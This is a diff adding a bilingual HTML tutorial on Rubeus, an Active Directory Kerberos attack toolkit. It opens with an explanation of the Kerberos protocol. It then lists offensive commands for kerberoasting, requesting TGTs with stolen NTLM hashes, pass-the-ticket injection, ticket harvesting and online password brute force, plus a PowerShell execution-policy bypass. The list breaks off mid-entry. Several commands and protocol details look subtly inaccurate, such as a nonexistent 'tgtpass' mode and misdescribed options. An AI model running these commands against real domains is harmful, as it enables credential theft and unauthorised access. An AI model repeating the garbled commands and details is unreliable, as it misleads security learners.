@@ -1,0 +1,514 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title data-lang-en="Rubeus Tutorial" data-lang-fr="Tutoriel Rubeus">Rubeus Tutorial</title>
+  <style>
+    body {
+      margin: 0;
+      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+      background-color: #1e102e;
+      color: #dddddd;
+    }
+
+    header {
+      position: relative;
+      width: 100%;
+      height: 100vh; /* Full screen height */
+      background: url("rubeusbanner.png") no-repeat center center;
+      background-size: contain; /* Ensure the entire image is visible */
+      background-position: center center; /* Center the image */
+      background-color: #1e102e; /* Fallback color for empty spaces */
+      box-shadow: 0 4px 20px rgba(0,0,0,0.6);
+    }
+
+    .scroll-indicator {
+      position: absolute;
+      bottom: 20px;
+      left: 50%;
+      transform: translateX(-50%);
+      color: #ffaa33;;
+      font-size: 16px;
+      text-align: center;
+      animation: bounce 2s infinite;
+    }
+
+    @keyframes bounce {
+      0%, 20%, 50%, 80%, 100% {
+        transform: translateX(-50%) translateY(0);
+      }
+      40% {
+        transform: translateX(-50%) translateY(-10px);
+      }
+      60% {
+        transform: translateX(-50%) translateY(-5px);
+      }
+    }
+
+    .content {
+      max-width: 900px;
+      margin: auto;
+      padding: 30px;
+      padding-top: 50px; /* Add spacing after the header */
+    }
+
+    h1 {
+      color: #ffaa33;
+      text-align: center;
+      margin-top: 0;
+    }
+
+    h2 {
+      color: #00aaff;
+      margin-top: 40px;
+    }
+
+    p {
+      line-height: 1.7;
+    }
+
+    code {
+      background: #2a1b3d;
+      padding: 4px 8px;
+      border-radius: 5px;
+      color: #ffaa33;
+    }
+
+    pre {
+      background-color: #2e1f45;
+      padding: 15px;
+      border-left: 5px solid #00aaff;
+      overflow-x: auto;
+    }
+
+    a {
+      color: #ffaa33;
+      text-decoration: none;
+    }
+
+    a:hover {
+      text-decoration: underline;
+    }
+    .kerberos-table {
+    width: 100%;
+    border-collapse: collapse;
+    font-family: Arial, sans-serif;
+    margin: 30px auto;
+    background-color: #1c1028;
+    color: #ddd;
+    box-shadow: 0 0 10px rgba(0,0,0,0.5);
+  }
+
+  .kerberos-table th,
+  .kerberos-table td {
+    border: 1px solid #444;
+    padding: 10px;
+    vertical-align: top;
+    text-align: left;
+  }
+
+  .kerberos-table th {
+    background-color: #2d1842;
+    color: #ffa600;
+    font-size: 18px;
+  }
+
+  .kerberos-table tr:nth-child(even) {
+    background-color: #241634;
+  }
+
+  .kerberos-table strong {
+    color: #00aaff;
+  }
+
+  .kerberos-table code {
+    color: #ffaa33;
+    background: #352144;
+    padding: 2px 6px;
+    border-radius: 4px;
+  }
+  
+    #lang-toggle {
+      position: fixed;
+      top: 20px;
+      right: 20px;
+      background: none;
+      border: none;
+      cursor: pointer;
+      z-index: 9999;
+    }
+    #flag-icon {
+      width: 40px;
+      height: 40px;
+    }
+  </style>
+  <script defer src="./script.js"></script>
+</head>
+<body>
+  <header>
+    <div class="scroll-indicator" data-lang-en="⬇️ Scroll down to continue" data-lang-fr="⬇️ Faites défiler pour continuer">⬇️ Faites défiler pour continuer</div>
+    <button id="lang-toggle">
+      <img id="flag-icon" src="fr.png" alt="Langue">
+    </button>
+  </header>
+
+  <div class="content">
+    <h1 data-lang-en="Rubeus Tutorial" data-lang-fr="Tutoriel Rubeus">Rubeus Tutorial</h1>
+
+    <h2 data-lang-en="Introduction" data-lang-fr="Introduction">Introduction</h2>
+    <p data-lang-en="Rubeus is a C# toolkit for Kerberos interaction and abuses. Kerberos, as we all know, is a ticket-based network authentication protocol and is used in Active Directories. Unfortunately, due to human error, often times AD is not configured properly keeping security in mind. Rubeus can exploit vulnerabilities arising out of these misconfigurations and perform functions such as crafting keys and granting access using forged certificates. The article serves as a guide on using Rubeus in various scenarios."
+       data-lang-fr="Rubeus est un outil C# pour interagir avec Kerberos et en abuser. Kerberos, comme nous le savons tous, est un protocole d'authentification réseau basé sur des tickets et est utilisé dans les Active Directories. Malheureusement, en raison d'erreurs humaines, les AD ne sont souvent pas configurés correctement en tenant compte de la sécurité. Rubeus peut exploiter les vulnérabilités résultant de ces mauvaises configurations et effectuer des fonctions telles que la création de clés et l'octroi d'accès à l'aide de certificats falsifiés. Cet article sert de guide pour utiliser Rubeus dans divers scénarios.">
+      Rubeus is a C# toolkit for Kerberos interaction and abuses...
+    </p>
+    
+    <h2 data-lang-en="Kerberos Authentication Flow" data-lang-fr="Flux d'authentification Kerberos">Kerberos Authentication Flow</h2>
+    <p data-lang-en="The Kerberos protocol defines how clients interact with a network authentication service. Clients obtain tickets from the Kerberos Key Distribution Center (KDC), and they submit these tickets to application servers when connections are established. It uses UDP port 88 by default and depends on the process of symmetric key cryptography. “Kerberos uses tickets to authenticate a user and completely avoids sending passwords across the network”. There are some key components in Kerberos authentication that play a crucial role in the entire authentication process."
+       data-lang-fr="Le protocole Kerberos définit comment les clients interagissent avec un service d'authentification réseau. Les clients obtiennent des tickets du Centre de Distribution de Clés Kerberos (KDC), et ils soumettent ces tickets aux serveurs d'application lorsque des connexions sont établies. Il utilise le port UDP 88 par défaut et dépend du processus de cryptographie symétrique. « Kerberos utilise des tickets pour authentifier un utilisateur et évite complètement d'envoyer des mots de passe sur le réseau ». Il existe des composants clés dans l'authentification Kerberos qui jouent un rôle crucial dans l'ensemble du processus d'authentification.">
+      The Kerberos protocol defines how clients interact with a network authentication service...
+    </p>
+        <table class="kerberos-table">
+            <thead>
+              <tr>
+                <th data-lang-en="Kerberos Components" data-lang-fr="Composants Kerberos">Kerberos Components</th>
+                <th data-lang-en="Roles" data-lang-fr="Rôles">Roles</th>
+              </tr>
+            </thead>
+            <tbody>
+              <tr>
+                <td data-lang-en="Volunteers (Players)" data-lang-fr="Volontaires (Joueurs)"><strong>Volunteers (Players)</strong></td>
+                <td data-lang-en="Client: A user who wants to access some service. KDC: Key Distribution Centre; handles authentication and ticket issuing. Application server: A dedicated server for specific service."
+                    data-lang-fr="Client : Un utilisateur qui souhaite accéder à un service. KDC : Centre de Distribution de Clés ; gère l'authentification et l'émission de tickets. Serveur d'application : Un serveur dédié à un service spécifique.">
+                  • <strong>Client</strong>: A user who wants to access some service.
+                  • <strong>KDC</strong>: Key Distribution Centre; handles authentication and ticket issuing.
+                  • <strong>Application server</strong>: A dedicated server for specific service.
+                </td>
+              </tr>
+              <tr>
+                <td data-lang-en="Encryption Keys" data-lang-fr="Clés de chiffrement"><strong>Encryption Keys</strong></td>
+                <td data-lang-en="krbtgt key: Using krbtgt account NTLM hash. User key: Using user NTLM hash. Service key: NTLM hash of service (can be user or computer). Session key: Shared between user and KDC. Service session key: Shared between user and service."
+                    data-lang-fr="Clé krbtgt : Utilisation du hachage NTLM du compte krbtgt. Clé utilisateur : Utilisation du hachage NTLM de l'utilisateur. Clé de service : Hachage NTLM du service (peut être un utilisateur ou un ordinateur). Clé de session : Partagée entre l'utilisateur et le KDC. Clé de session de service : Partagée entre l'utilisateur et le service.">
+                  krbtgt key: Using krbtgt account NTLM hash.
+                  User key: Using user NTLM hash.
+                  Service key: NTLM hash of service (can be user or computer).
+                  Session key: Shared between user and KDC.
+                  Service session key: Shared between user and service.
+                </td>
+              </tr>
+              <tr>
+                <td data-lang-en="Tickets" data-lang-fr="Tickets"><strong>Tickets</strong></td>
+                <td data-lang-en="TGT (Ticket Granting Ticket): ticket to request TGSs; encrypted with KDC key. TGS (Ticket Granting Service): ticket used to authenticate to a service; encrypted with the service key."
+                    data-lang-fr="TGT (Ticket Granting Ticket) : ticket pour demander des TGS ; chiffré avec la clé KDC. TGS (Ticket Granting Service) : ticket utilisé pour s'authentifier à un service ; chiffré avec la clé de service.">
+                  <strong>TGT</strong> (Ticket Granting Ticket): ticket to request TGSs; encrypted with KDC key.
+                  <strong>TGS</strong> (Ticket Granting Service): ticket used to authenticate to a service; encrypted with the service key.
+                </td>
+              </tr>
+              <tr>
+                <td data-lang-en="PAC" data-lang-fr="PAC"><strong>PAC</strong></td>
+                <td data-lang-en="Privilege Attribute Certificate: Contains user privileges; signed using KDC key."
+                    data-lang-fr="Certificat d'Attribut de Privilège : Contient les privilèges de l'utilisateur ; signé avec la clé KDC.">
+                  <strong>Privilege Attribute Certificate</strong>: Contains user privileges; signed using KDC key.
+                </td>
+              </tr>
+              <tr>
+                <td data-lang-en="Message" data-lang-fr="Message"><strong>Message</strong></td>
+                <td data-lang-en="KRB_AS_REQ: User sends request for TGT to KDC. KRB_AS_REP: KDC replies with TGT. KRB_TGS_REQ: User sends TGS request using TGT. KRB_TGS_REP: KDC replies with TGS. KRB_AP_REQ: User authenticates with TGS to access service. KRB_AP_REP: (Optional) Service replies to validate identity. KRB_ERROR: Error message from KDC or service."
+                    data-lang-fr="KRB_AS_REQ : L'utilisateur envoie une demande de TGT au KDC. KRB_AS_REP : Le KDC répond avec un TGT. KRB_TGS_REQ : L'utilisateur envoie une demande de TGS en utilisant le TGT. KRB_TGS_REP : Le KDC répond avec un TGS. KRB_AP_REQ : L'utilisateur s'authentifie avec le TGS pour accéder au service. KRB_AP_REP : (Optionnel) Le service répond pour valider l'identité. KRB_ERROR : Message d'erreur du KDC ou du service.">
+                  <code>KRB_AS_REQ</code>: User sends request for TGT to KDC.
+                  <code>KRB_AS_REP</code>: KDC replies with TGT.
+                  <code>KRB_TGS_REQ</code>: User sends TGS request using TGT.
+                  <code>KRB_TGS_REP</code>: KDC replies with TGS.
+                  <code>KRB_AP_REQ</code>: User authenticates with TGS to access service.
+                  <code>KRB_AP_REP</code>: (Optional) Service replies to validate identity.
+                  <code>KRB_ERROR</code>: Error message from KDC or service.
+                </td>
+              </tr>
+            </tbody>
+          </table>
+          
+              <section class="kerberos-workflow">
+                <h2 data-lang-en="Kerberos Workflow using Messages" data-lang-fr="Flux de travail Kerberos utilisant des messages">Kerberos Workflow using Messages</h2>
+              
+                <p data-lang-en="In the Active Directory domain, every domain controller runs a KDC (Kerberos Distribution Center) service that processes all requests for tickets to Kerberos. For Kerberos tickets, AD uses the KRBTGT account in the AD domain."
+                   data-lang-fr="Dans le domaine Active Directory, chaque contrôleur de domaine exécute un service KDC (Kerberos Distribution Center) qui traite toutes les demandes de tickets pour Kerberos. Pour les tickets Kerberos, AD utilise le compte KRBTGT dans le domaine AD.">
+                  In the Active Directory domain, every domain controller runs a KDC (Kerberos Distribution Center) service that processes all requests for tickets to Kerberos...
+                </p>
+              
+                <p data-lang-en="The image below shows that the major role played by KDC in establishing a secure connection between the server & the client and the entire process uses some special components as defined in the table above."
+                   data-lang-fr="L'image ci-dessous montre le rôle majeur joué par le KDC dans l'établissement d'une connexion sécurisée entre le serveur et le client, et l'ensemble du processus utilise certains composants spéciaux comme défini dans le tableau ci-dessus.">
+                  The image below shows that the major role played by KDC in establishing a secure connection between the server & the client...
+                </p>
+              
+                <!-- Intégration de l’image -->
+                <img src="rub1.png" alt="Kerberos Workflow Diagram">
+              
+                <p data-lang-en="As mentioned above, Kerberos uses symmetric cryptography for encryption and decryption. Let us get into more details and try to understand how encrypted messages are sent to each other."
+                   data-lang-fr="Comme mentionné ci-dessus, Kerberos utilise la cryptographie symétrique pour le chiffrement et le déchiffrement. Entrons dans plus de détails et essayons de comprendre comment les messages chiffrés sont envoyés les uns aux autres.">
+                  As mentioned above, Kerberos uses symmetric cryptography for encryption and decryption...
+                </p>
+              
+                <p data-lang-en="Here we use three colours to distinguish Hashes:  • BLUE_KEY: User NTLM HASH  • YELLOW_KEY: krbtgt NTLM HASH  • RED_KEY: Service NTLM HASH"
+                   data-lang-fr="Ici, nous utilisons trois couleurs pour distinguer les hachages :  • BLUE_KEY : Hachage NTLM de l'utilisateur  • YELLOW_KEY : Hachage NTLM de krbtgt  • RED_KEY : Hachage NTLM du service">
+                  Here we use three colours to distinguish Hashes...
+                </p>
+              
+                <h3 style="color:#ffaa33;" data-lang-en="Step 1:" data-lang-fr="Étape 1 :">Step 1:</h3>
+                <p data-lang-en="By sending the request message to KDC, client initializes communication as:"
+                   data-lang-fr="En envoyant le message de demande au KDC, le client initialise la communication comme suit :">
+                  By sending the request message to KDC, client initializes communication as...
+                </p>
+              
+                <p data-lang-en="KRB_AS_REQ contains the following:  - Username of the client to be authenticated.  - The service SPN (SERVICE PRINCIPAL NAME) linked with krbtgt account  - An encrypted timestamp (Locked with User Hash: Blue Key)  The entire message is encrypted using the User NTLM hash (Locked with BLUE KEY) to authenticate the user and prevent replay attacks."
+                   data-lang-fr="KRB_AS_REQ contient les éléments suivants :  - Nom d'utilisateur du client à authentifier.  - Le SPN du service (SERVICE PRINCIPAL NAME) lié au compte krbtgt  - Un horodatage chiffré (Verrouillé avec le hachage de l'utilisateur : Clé Bleue)  L'ensemble du message est chiffré à l'aide du hachage NTLM de l'utilisateur (Verrouillé avec la CLÉ BLEUE) pour authentifier l'utilisateur et empêcher les attaques par rejeu.">
+                  KRB_AS_REQ contains the following...
+                </p>
+              </section>
+              <!-- Étapes 2 et 3 : Kerberos Workflow (suite) -->
+<section class="kerberos-workflow">
+    <h3 style="color: #ffaa33;" data-lang-en="Step 2:" data-lang-fr="Étape 2 :">Step 2:</h3>
+    <p data-lang-en="The KDC uses a database consisting of Users/Krbtgt/Services hashes to decrypt a message (Unlock with BLUE KEY) that authenticates user identification."
+       data-lang-fr="Le KDC utilise une base de données composée des hachages des utilisateurs/Krbtgt/services pour déchiffrer un message (Déverrouiller avec la CLÉ BLEUE) qui authentifie l'identification de l'utilisateur.">
+      The KDC uses a database consisting of Users/Krbtgt/Services hashes to decrypt a message...
+    </p>
+  
+    <p data-lang-en="Then KDC will generate TGT (Ticket Granting Ticket) for a client that is encrypted using Krbtgt hash (Locked with Yellow Key) & some encrypted message using User Hash."
+       data-lang-fr="Ensuite, le KDC générera un TGT (Ticket Granting Ticket) pour un client qui est chiffré à l'aide du hachage Krbtgt (Verrouillé avec la Clé Jaune) et un message chiffré à l'aide du hachage de l'utilisateur.">
+      Then KDC will generate TGT (Ticket Granting Ticket) for a client...
+    </p>
+  
+    <p data-lang-en="KRB_AS_REP contains the following:  - Username  - Some encrypted data (Locked with User Hash: Blue Key) that contains:  Session key The expiration date of TGT  TGT (Locked with Krbtgt Hash: Yellow Key) which contains:  Username Session key The expiration date of TGT PAC with user privileges, signed by KDC "
+       data-lang-fr="KRB_AS_REP contient les éléments suivants :  - Nom d'utilisateur  - Certaines données chiffrées (Verrouillées avec le hachage de l'utilisateur : Clé Bleue) qui contiennent :  Clé de session La date d'expiration du TGT  TGT (Verrouillé avec le hachage Krbtgt : Clé Jaune) qui contient :  Nom d'utilisateur Clé de session La date d'expiration du TGT PAC avec les privilèges de l'utilisateur, signé par le KDC ">
+      KRB_AS_REP contains the following...
+    </p>
+  
+    <img src="rub2.png" alt="Kerberos Step 2 and 3 Diagram">
+  
+    <h3 style="color: #ffaa33;" data-lang-en="Step 3:" data-lang-fr="Étape 3 :">Step 3:</h3>
+    <p data-lang-en="The KRB_TGT will be stored in the Kerberos tray (Memory) of the client machine, as the user already has the KRB_TGT, which is used to identify himself for the TGS request. The client sends a copy of the TGT with the encrypted data to KDC."
+       data-lang-fr="Le KRB_TGT sera stocké dans le plateau Kerberos (Mémoire) de la machine cliente, car l'utilisateur possède déjà le KRB_TGT, qui est utilisé pour s'identifier pour la demande de TGS. Le client envoie une copie du TGT avec les données chiffrées au KDC.">
+      The KRB_TGT will be stored in the Kerberos tray (Memory) of the client machine...
+    </p>
+  
+    <p data-lang-en="KRB_TGS_REQ contains:  Encrypted data with the session key Username Timestamp  + TGT  + SPN of requested service (e.g. SQL service)"
+       data-lang-fr="KRB_TGS_REQ contient :  Données chiffrées avec la clé de session Nom d'utilisateur Horodatage  + TGT  + SPN du service demandé (par exemple, service SQL)">
+      KRB_TGS_REQ contains...
+    </p>
+  </section>
+  <!-- Étapes 4 et 5 : Kerberos Workflow (suite) -->
+<section class="kerberos-workflow">
+    <h3 style="color: #ffaa33;" data-lang-en="Step 4:" data-lang-fr="Étape 4 :">Step 4:</h3>
+    <p data-lang-en="The KDC receives the KRB_TGS_REQ message and decrypts it using Krbtgt hash to verify TGT (Unlock using Yellow Key), then KDC returns a TGS as KRB_TGS_REP which is encrypted using requested service hash (Locked with Red Key) and some encrypted message using User Hash."
+       data-lang-fr="Le KDC reçoit le message KRB_TGS_REQ et le déchiffre à l'aide du hachage Krbtgt pour vérifier le TGT (Déverrouiller avec la Clé Jaune), puis le KDC renvoie un TGS sous forme de KRB_TGS_REP qui est chiffré à l'aide du hachage du service demandé (Verrouillé avec la Clé Rouge) et un message chiffré à l'aide du hachage de l'utilisateur.">
+      The KDC receives the KRB_TGS_REQ message and decrypts it using Krbtgt hash...
+    </p>
+  
+    <p data-lang-en="KRB_TGS_REP contains:  Username Encrypted data with the session key:  Service session key The expiration date of TGS   TGS (Service Hash: RED Key) which contains:  Service session key Username The expiration date of TGS PAC with user privileges, signed by KDC   "
+       data-lang-fr="KRB_TGS_REP contient :  Nom d'utilisateur Données chiffrées avec la clé de session :  Clé de session de service La date d'expiration du TGS   TGS (Hachage de service : Clé Rouge) qui contient :  Clé de session de service Nom d'utilisateur La date d'expiration du TGS PAC avec les privilèges de l'utilisateur, signé par le KDC   ">
+      KRB_TGS_REP contains...
+    </p>
+  
+    <img src="rub3.png" alt="Kerberos Steps 4 and 5 Diagram">
+  
+    <h3 style="color: #ffaa33;" data-lang-en="Step 5:" data-lang-fr="Étape 5 :">Step 5:</h3>
+    <p data-lang-en="The user sent the copy of TGS to the Application Server."
+       data-lang-fr="L'utilisateur a envoyé la copie du TGS au serveur d'application.">
+      The user sent the copy of TGS to the Application Server...
+    </p>
+  
+    <p data-lang-en="KRB_AP_REQ contains:  TGS Encrypted data with the service session key:  Username Timestamp, to avoid replay attacks   "
+       data-lang-fr="KRB_AP_REQ contient :  TGS Données chiffrées avec la clé de session de service :  Nom d'utilisateur Horodatage, pour éviter les attaques par rejeu   ">
+      KRB_AP_REQ contains...
+    </p>
+  </section>
+  <!-- Étapes 6 à 8 + SPN -->
+<section class="kerberos-workflow">
+    <h3 style="color: #ffaa33;" data-lang-en="Step 6:" data-lang-fr="Étape 6 :">Step 6:</h3>
+    <p data-lang-en="The application attempts to decrypt the message using its NTLM hash and to verify the PAC from KDC to identify user privileges, which is an optional case."
+       data-lang-fr="L'application tente de déchiffrer le message à l'aide de son hachage NTLM et de vérifier le PAC du KDC pour identifier les privilèges de l'utilisateur, ce qui est un cas facultatif.">
+      The application attempts to decrypt the message using its NTLM hash...
+    </p>
+  
+    <h3 style="color: #ffaa33;" data-lang-en="Step 7:" data-lang-fr="Étape 7 :">Step 7:</h3>
+    <p data-lang-en="KDC verifies PAC (Optional)."
+       data-lang-fr="Le KDC vérifie le PAC (Optionnel).">
+      KDC verifies PAC...
+    </p>
+  
+    <h3 style="color: #ffaa33;" data-lang-en="Step 8:" data-lang-fr="Étape 8 :">Step 8:</h3>
+    <p data-lang-en="The application allows the user to access the service for a specific time."
+       data-lang-fr="L'application permet à l'utilisateur d'accéder au service pour une durée spécifique.">
+      The application allows the user to access the service for a specific time...
+    </p>
+  
+    <!-- Image Kerberos steps 6-8 -->
+    <img src="rub4.png" alt="Kerberos Steps 6 to 8 Diagram">
+  
+    <h3 style="color: #ffaa33;" data-lang-en="🔐 Service Principal Name (SPN)" data-lang-fr="🔐 Nom Principal de Service (SPN)">🔐 Service Principal Name (SPN)</h3>
+    <p data-lang-en="The Service Principal Name (SPN) is a unique identifier for a service instance. Active Directory Domain Services and Windows provide support for SPNs, which are key components of the Kerberos mechanism through which a client authenticates a service."
+       data-lang-fr="Le Nom Principal de Service (SPN) est un identifiant unique pour une instance de service. Les services de domaine Active Directory et Windows prennent en charge les SPN, qui sont des composants clés du mécanisme Kerberos par lequel un client authentifie un service.">
+      The Service Principal Name (SPN) is a unique identifier for a service instance...
+    </p>
+  
+    <h4 style="color: #ffaa33;" data-lang-en="Important Points" data-lang-fr="Points Importants">Important Points</h4>
+    
+      <li data-lang-en="If you install multiple instances of a service on computers throughout a forest, each instance must have its SPN."
+          data-lang-fr="Si vous installez plusieurs instances d'un service sur des ordinateurs dans une forêt, chaque instance doit avoir son propre SPN.">
+        If you install multiple instances of a service on computers throughout a forest...
+      
+      <li data-lang-en="Before the Kerberos authentication service can use an SPN to authenticate a service, the SPN must be registered on the account."
+          data-lang-fr="Avant que le service d'authentification Kerberos puisse utiliser un SPN pour authentifier un service, le SPN doit être enregistré sur le compte.">
+        Before the Kerberos authentication service can use an SPN to authenticate a service...
+      
+      <li data-lang-en="A given SPN can be registered only once in the forest."
+          data-lang-fr="Un SPN donné ne peut être enregistré qu'une seule fois dans la forêt.">
+        A given SPN can be registered only once in the forest...
+      
+      <li data-lang-en="An SPN must be unique in the forest in which it is registered."
+          data-lang-fr="Un SPN doit être unique dans la forêt dans laquelle il est enregistré.">
+        An SPN must be unique in the forest in which it is registered...
+      
+    
+  </section>
+  <section class="kerberos-workflow">
+    <h3 style="color: #ffaa33;" data-lang-en="🧩 SPN Syntax" data-lang-fr="🧩 Syntaxe SPN">🧩 SPN Syntax</h3>
+  
+    <p data-lang-en="If it is not unique, authentication will fail."
+       data-lang-fr="S'il n'est pas unique, l'authentification échouera.">
+      If it is not unique, authentication will fail...
+    </p>
+  
+    <p data-lang-en="The SPN syntax has four elements"
+       data-lang-fr="La syntaxe SPN comporte quatre éléments">
+      The SPN syntax has four elements...
+    </p>
+  
+    <!-- Image SPN syntax -->
+    <img src="rub5.png" alt="SPN Syntax Example">
+  
+    <p data-lang-en="Example: MSSQLSVC/ WIN-S0VKMTVLD2/ignite.local:1433"
+       data-lang-fr="Exemple : MSSQLSVC/ WIN-S0VKMTVLD2/ignite.local:1433">
+      Example: MSSQLSVC/ WIN-S0VKMTVLD2/ignite.local:1433
+    </p>
+  
+    <h4 style="color: #ffaa33;" data-lang-en="Type of SPN:" data-lang-fr="Type de SPN :">Type of SPN:</h4>
+    
+      <li data-lang-en="Host-based SPNs – associated with the computer account in AD, uses a randomly generated 128-character long password which is rotated every 30 days. It cannot be used in Kerberoasting attacks."
+          data-lang-fr="SPN basés sur l'hôte – associés au compte d'ordinateur dans AD, utilisent un mot de passe généré aléatoirement de 128 caractères qui est renouvelé tous les 30 jours. Ils ne peuvent pas être utilisés dans les attaques de Kerberoasting.">
+        Host-based SPNs – associated with the computer account in AD...
+      
+      <li data-lang-en="User-based SPNs – associated with a domain user account where the NTLM hash **can be used**."
+          data-lang-fr="SPN basés sur l'utilisateur – associés à un compte utilisateur de domaine où le hachage NTLM **peut être utilisé**.">
+        User-based SPNs – associated with a domain user account...
+      
+    
+  </section>
+  
+    <h2 data-lang-en="📦 Main Functions" data-lang-fr="📦 Fonctions principales">📦 Main Functions</h2>
+    
+      <li data-lang-en="Requesting TGT / TGS tickets" data-lang-fr="Demande de tickets TGT / TGS">Requesting TGT / TGS tickets
+      <li data-lang-en="Pass-the-Ticket (PTT)" data-lang-fr="Pass-the-Ticket (PTT)">Pass-the-Ticket (PTT)
+      <li data-lang-en="Kerberoasting" data-lang-fr="Kerberoasting">Kerberoasting
+      <li data-lang-en="Overpass-the-Hash" data-lang-fr="Overpass-the-Hash">Overpass-the-Hash
+      <li data-lang-en="Export/Import tickets" data-lang-fr="Export/Import de tickets">Export/Import tickets
+    
+
+    <h2 data-lang-en="⚙️ Example Usage: Kerberoasting" data-lang-fr="⚙️ Exemple d'utilisation : Kerberoasting">⚙️ Example Usage: Kerberoasting</h2>
+    <pre><code data-lang-en="Rubeus kerberoast /output:hashes.txt" data-lang-fr="Rubeus kerberoast /output:hashes.txt">Rubeus kerberoast /output:hashes.txt</code></pre>
+    <p data-lang-en="This mode allows extracting service tickets (TGS) of user accounts with SPNs. These tickets can then be cracked to retrieve passwords."
+       data-lang-fr="Ce mode permet d’extraire les tickets de service (TGS) des comptes utilisateurs disposant de SPN. Ces tickets peuvent ensuite être crackés pour récupérer les mots de passe.">
+      This mode allows extracting service tickets (TGS)...
+    </p>
+
+    <h2 data-lang-en="🛠️ Execution from PowerShell" data-lang-fr="🛠️ Exécution depuis PowerShell">🛠️ Execution from PowerShell</h2>
+    <pre><code data-lang-en="powershell -exec bypass -c &quot;Import-Module .\Rubeus.ps1; Rubeus.exe kerberoast&quot;" data-lang-fr="powershell -exec bypass -c &quot;Import-Module .\Rubeus.ps1; Rubeus.exe kerberoast&quot;">powershell -exec bypass -c "Import-Module .\Rubeus.ps1; Rubeus.exe kerberoast"</code></pre>
+        <h2 data-lang-en="🧪 15 Rubeus Commands to Know" data-lang-fr="🧪 15 Commandes Rubeus à Connaître">🧪 15 Rubeus Commands to Know</h2>
+        <p data-lang-en="Here is a list of useful commands to manipulate Kerberos with Rubeus. Each command can be used depending on the testing phase (reconnaissance, exploitation, post-exploitation). This summary does not go into technical details but provides a good starting point."
+           data-lang-fr="Voici une liste de commandes utiles pour manipuler Kerberos avec Rubeus. Chaque commande peut être utilisée en fonction de la phase de test (reconnaissance, exploitation, post-exploitation). Ce résumé ne rentre pas dans les détails techniques, mais offre une bonne base de travail.">
+          Here is a list of useful commands to manipulate Kerberos with Rubeus...
+        </p>
+      
+        <pre><code data-lang-en="1. Rubeus.exe kerberoast
+      # Retrieves service tickets (TGS) exploitable by Kerberoasting" data-lang-fr="1. Rubeus.exe kerberoast
+      # Récupère les tickets de service (TGS) exploitables par Kerberoasting">1. Rubeus.exe kerberoast
+      # Retrieves service tickets (TGS) exploitable by Kerberoasting</code></pre>
+      
+        <pre><code data-lang-en="2. Rubeus.exe asktgt /user:Zed /rc4:NTLM_HASH
+      # Requests a TGT using a known NTLM hash" data-lang-fr="2. Rubeus.exe asktgt /user:Zed /rc4:NTLM_HASH
+      # Demande un TGT en utilisant un hash NTLM connu">2. Rubeus.exe asktgt /user:Zed /rc4:NTLM_HASH
+      # Requests a TGT using a known NTLM hash</code></pre>
+      
+        <pre><code data-lang-en="3. Rubeus.exe tgtdeleg
+      # Requests a TGT via implicit delegation (clear TGT)" data-lang-fr="3. Rubeus.exe tgtdeleg
+      # Demande un TGT via délégation implicite (TGT en clair)">3. Rubeus.exe tgtdeleg
+      # Requests a TGT via implicit delegation (clear TGT)</code></pre>
+      
+        <pre><code data-lang-en="4. Rubeus.exe dump
+      # Displays the Kerberos tickets currently in memory" data-lang-fr="4. Rubeus.exe dump
+      # Affiche les tickets Kerberos actuellement présents en mémoire">4. Rubeus.exe dump
+      # Displays the Kerberos tickets currently in memory</code></pre>
+      
+        <pre><code data-lang-en="5. Rubeus.exe ptt /ticket:ticket.kirbi
+      # Injects a .kirbi ticket into memory (Pass-the-Ticket)" data-lang-fr="5. Rubeus.exe ptt /ticket:ticket.kirbi
+      # Injecte un ticket .kirbi dans la mémoire (Pass-the-Ticket)">5. Rubeus.exe ptt /ticket:ticket.kirbi
+      # Injects a .kirbi ticket into memory (Pass-the-Ticket)</code></pre>
+      
+        <pre><code data-lang-en="6. Rubeus.exe tgtrenew /ticket:ticket.kirbi
+      # Renews an existing TGT with its .kirbi ticket" data-lang-fr="6. Rubeus.exe tgtrenew /ticket:ticket.kirbi
+      # Renouvelle un TGT existant avec son ticket .kirbi">6. Rubeus.exe tgtrenew /ticket:ticket.kirbi
+      # Renews an existing TGT with its .kirbi ticket</code></pre>
+      
+        <pre><code data-lang-en="7. Rubeus.exe tgtpass /user:Zed /rc4:NTLM_HASH
+      # Generates a TGT via Overpass-the-Hash (OPTH)" data-lang-fr="7. Rubeus.exe tgtpass /user:Zed /rc4:NTLM_HASH
+      # Génère un TGT via Overpass-the-Hash (OPTH)">7. Rubeus.exe tgtpass /user:Zed /rc4:NTLM_HASH
+      # Generates a TGT via Overpass-the-Hash (OPTH)</code></pre>
+      
+        <pre><code data-lang-en="8. Rubeus.exe hash
+      # Dumps the Kerberos hashes extracted via tickets (roasting, etc)" data-lang-fr="8. Rubeus.exe hash
+      # Dump les hash Kerberos extraits via tickets (roasting, etc)">8. Rubeus.exe hash
+      # Dumps the Kerberos hashes extracted via tickets (roasting, etc)</code></pre>
+      
+        <pre><code data-lang-en="9. Rubeus.exe monitor /interval:30
+      # Monitors new tickets in real-time" data-lang-fr="9. Rubeus.exe monitor /interval:30
+      # Surveille les nouveaux tickets en temps réel">9. Rubeus.exe monitor /interval:30
+      # Monitors new tickets in real-time</code></pre>
+      
+        <pre><code data-lang-en="10. Rubeus.exe ticket /lifetime:2 /rc4:NTLM_HASH
+      # Generates a TGT with a custom duration" data-lang-fr="10. Rubeus.exe ticket /lifetime:2 /rc4:NTLM_HASH
+      # Génère un TGT avec une durée personnalisée">10. Rubeus.exe ticket /lifetime:2 /rc4:NTLM_HASH
+      # Generates a TGT with a custom duration</code></pre>
+      
+        <pre><code data-lang-en="11. Rubeus.exe harvest /interval:20 /nowrap
+      # Retrieves tickets present on the machine and displays them in a loop" data-lang-fr="11. Rubeus.exe harvest /interval:20 /nowrap
+      # Récupère les tickets présents sur la machine et les affiche en boucle">11. Rubeus.exe harvest /interval:20 /nowrap
+      # Retrieves tickets present on the machine and displays them in a loop</code></pre>
+      
+        <pre><code data-lang-en="12. Rubeus.exe brute /userlist:users.txt /passwordlist:pw.txt /domain:lab.local
+      # Online brute force attack against Kerberos" data-lang-fr="12. Rubeus.exe brute /userlist:users.txt /passwordlist:pw.txt /domain:lab.local
+      # Attaque par bruteforce en ligne contre Kerberos">12. Rubeus.exe brute /userlist:users.txt /passwordlist:pw.txt /domain:lab.local
+      # Online brute force attack against Kerberos</code></pre>
+      
+        <pre><code data-lang-en="13. Rubeus.exe createnetonly /program:cmd.exe
+      # Creates a process without Kerberos authentication (netonly)" data-lang-fr="13. Rubeus.exe createnetonly /program:cmd.exe
